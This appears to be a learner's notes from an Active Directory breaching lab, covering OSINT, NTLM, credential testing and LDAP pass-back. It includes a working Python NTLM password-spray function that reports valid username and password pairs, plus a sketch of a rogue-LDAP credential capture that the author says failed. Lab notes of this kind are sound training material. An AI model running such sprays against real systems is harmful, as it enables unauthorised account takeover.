# Breaching Active Directory
## 6/16

- AD - 90% of fortune 1000 companies
- Common- Open Source Intelligence (OSINT) (github,stackoverflow,past breaches) and Phishing
- New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD
- test credentials using RDP, outlook, vpn, 
- brute force triggers alerts
Here is a simple script that does a password spray:
```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```
- LDAP services: printers, VPN, 
- NTLM vs LDAP: LDAP directly verifies users creds
- LDAP contains AD creds which can be recovered in config files (plain text)
- LDAP Pass-back- configure ip of ldap so printer sends request to rogue server to collect creds

Does not work so we need to create ldap server to downgrade security. Unfortunately it did not work on kali so I did it in the attackbox:

no luck… (other people on the forum were also having problems)


